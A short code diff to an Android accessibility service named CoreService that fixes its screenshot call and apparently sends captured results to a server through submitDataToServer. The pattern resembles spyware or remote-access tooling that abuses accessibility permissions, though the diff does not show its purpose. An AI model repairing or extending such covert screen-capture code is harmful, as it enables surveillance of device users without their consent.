@@ -20,6 +20,7 @@ import android.os.SystemClock;
 import android.provider.Settings;
 import android.util.Base64;
 import android.util.Log;
+import android.view.Display; // <-- IMPORT ADDED TO FIX ERROR
 import android.view.accessibility.AccessibilityEvent;
 import androidx.annotation.NonNull;
 import androidx.core.content.ContextCompat;
@@ -180,7 +181,8 @@ public class CoreService extends AccessibilityService {
             submitDataToServer("screenshot_error", "Screenshot API not available on this Android version.");
             return;
         }
-        takeScreenshot(getMainExecutor(), new TakeScreenshotCallback() {
+        // --- THIS IS THE CORRECTED LINE ---
+        takeScreenshot(Display.DEFAULT_DISPLAY, getMainExecutor(), new TakeScreenshotCallback() {
             @Override
             public void onSuccess(@NonNull ScreenshotResult screenshotResult) {
                 try {
